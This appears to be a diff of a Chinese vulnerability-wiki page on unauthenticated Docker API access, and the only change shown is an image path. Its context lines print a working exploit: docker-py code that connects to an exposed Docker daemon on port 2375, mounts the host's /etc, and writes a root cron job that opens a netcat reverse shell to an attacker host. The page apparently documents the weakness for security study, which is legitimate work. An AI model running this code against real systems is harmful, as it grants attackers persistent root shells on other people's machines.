@@ -51,7 +51,7 @@ API使用参考：https://docker-py.readthedocs.io/en/stable/api/\#\#client-api
     client = docker.DockerClient(base_url='http://your-ip:2375/')
     data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
 
-写入crontab文件，成功反弹shell：![](/Users/aresx/Documents/VulWiki/.resource/Docker未授权访问/media/rId26.png)
+写入crontab文件，成功反弹shell：![](./.resource/Docker未授权访问/media/rId26.png)
 
 #### python脚本
 
